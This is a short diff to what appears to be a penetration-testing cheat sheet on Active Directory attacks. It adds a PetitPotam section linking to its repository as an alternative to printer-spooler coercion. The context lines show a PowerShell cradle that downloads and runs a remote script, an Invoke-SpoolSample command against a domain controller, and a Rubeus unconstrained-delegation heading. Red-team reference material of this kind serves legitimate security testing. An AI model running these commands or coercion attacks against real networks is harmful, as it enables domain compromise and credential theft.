@@ -988,6 +988,11 @@ iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com
 
 ```Invoke-SpoolSample DC01 WebSrv_ownd```
 
+#### PetitPotam
+If you got no printer you can try this one:
+https://github.com/topotam/PetitPotam
+
+
 * * *
 
 #### Rubeus Unconstrained Delegation Attack Flow with SpoolSample
